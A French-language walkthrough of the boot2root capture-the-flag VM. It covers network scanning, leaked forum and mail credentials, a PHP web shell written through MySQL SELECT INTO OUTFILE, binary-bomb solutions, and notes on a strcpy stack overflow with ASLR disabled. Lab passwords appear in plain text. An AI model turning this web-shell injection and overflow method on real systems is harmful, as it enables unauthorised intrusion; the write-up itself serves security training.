Pour récuperer l'adresse IP de la VM on lance un nmap pour scanner le réseau
```bash
nmap -A 172.16.96.1/24
```

Quand nous lancon boot2root, la vm ouvre un port https.
Avec un dirbuster nous avous a trouver que le path /forum et /webmail exist.
Dans le forum nous trouvons des logs qui nous permette de leaker le mot de passe de lmezard:!q\]Ej?*5K5cy*AJ
Avec l'email de lmezard nous arrivons a nous connecter a sa boite mail ou un mail avec les identifiant root de mysql sont present root:Fg-'kKXBj87E:aJ$
Dans mysql nous pouvont ecrire dans le system avec un commande du style OUTFILE.
Nous pouvons trouver l'arborescence de mylittleforum sur son github. Finalement il semble que le dossier templates_c soit accessible en ecriture.
On peut upload un shell avec cette command.
SELECT "<?php system($_GET['cmd']) ?>" INTO OUTFILE "/var/www/forum/templates_c/shell.php"
nous pouvons telecharger les identifiant du ftp dans /home/LOOKATME
lmezard
G!@M6f4Eatau{sF"

Avec ces identifiant nous pouvont ensuite telecharger une tarball fun
Cette tarball contenait un dossier ft_fun qui conténer a son tour des fichier pcap.
Dans chaque fichier pcap il y avait un comment qui préciser l'order de ce fichier par rapport au autre. 
Une fois reconstituer ces fichier formée un code source C qui une fois compiler demander de hasher un mot de passe.
Un fois hasher, le resultat consituer le mot de passe de laurie.
laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
Pour récuper le mot de passe de thor nous devons desarmorcer des bombe succésive.

Pour desamorcé la premiere phase il suffit de rentré la chaine
Public speaking is very easy.

Pour la deuxieme phase, il suffit juste de rentré une suite de nombre dont chaque element est le resultat de sa position+1 * le nombre precedent
La suite commence par 1

1 2 6 24 120 720

La troisieme phase est une fonction qui attend trois argument de type int, char, int.
Le premier int est une sousfonction qui compare le deuxieme est troisieme argument.
C'est une jump table.
Au total voici les solution:
0 q 777
1 b 214
2 b 755
3 k 251
4 o 160
5 t 458
6 v 780
7 b 524

Pour la quatrieme phase, il suffit de trouver le nombre qui quand on le rentre dans la fonction fibonacci le resultat est 55 en decimale.
Ce nombre est 9.

Pour la cinquieme phase, il faut reussit a traduire l'input saisie vers "giants" avec l'encodage suivant "isrveawhobpnutfg".
Equivalemnt a xlatb en assembler.
Le code fait juste un bitwise and sur les character. Il y a donc plusieur solution.

Pour la sixième phase, La bombe regarde d'abort si dans la sequence il n'y a pas de doublon est que les nombre sont entre 1-6.
En fonction des nombre il arrange une liste chainer dont les indice des noeuds sont egaux a ceux des nombre rentré.
Les noeuds de la link list sont comme suit:

struct Node {
	int number;
	int order;
	struct Node* next;
};

Il itere dans la suite pour voir les number sont en ordre décroissant. Si il le sont la bombe peux etres desamorcé ;).

0x804b26c <node1>:      0x000000fd      0x00000001      0x0804b260
0x804b260 <node2>:      0x000002d5      0x00000002      0x0804b254
0x804b254 <node3>:      0x0000012d      0x00000003      0x0804b248
0x804b248 <node4>:      0x000003e5      0x00000004      0x0804b23c
0x804b23c <node5>:      0x000000d4      0x00000005      0x0804b230
0x804b230 <node6>:      0x000001b0      0x00000006      0x00000000

4 2 6 3 1 5

A noter que dans cette exercise il y a une partie cacher avec des arbre binaire.
il suffit de rajouter austinpowers a la quatrieme phase

9 austinpowers 

Le dernier exercice utilise cette arbre binaire.
Pour desamorcé la phase cache il faut rentré le nombre 1001

                         36         
              /                      \
             8                        50
         /       \                /        \
        6         22             45         107
       / \       /  \           /  \       /   \
      1   7     20   35        40   47    99   1001

Apres plusieur essaie, et une visite sur le slack qui nous informe qu'il faut swap les deux dernier character, le mot de passe est le suivant:
thor
Publicspeakingisveryeasy.126241207201b2149opekmq426135

On a un fichier turtle qui donne des indications pour la librairie turtle de python.
On fait un script python pour nettoyer le fichier et on passe les instructions au module turtle.py.
Sa nous affiche un mot de passe "SLASH" sous forme de dessin que l'on doit hasher en md5
```bash
echo -n "SLASH" | md5
646da671ca01bb5d84dbb5fb2238dc8e
```

Nous pouvons voir que sur la machine l'ASLR est desactivé.
cat /proc/sys/kernel/randomize_va_space -> $00
La stack est executable.
readelf -a exploit_me | grep GNU_STACK -> RWE
Le programe copy argv[1] avec strcpy. Il suffit donc de faire un shellcode sans null byt\
e.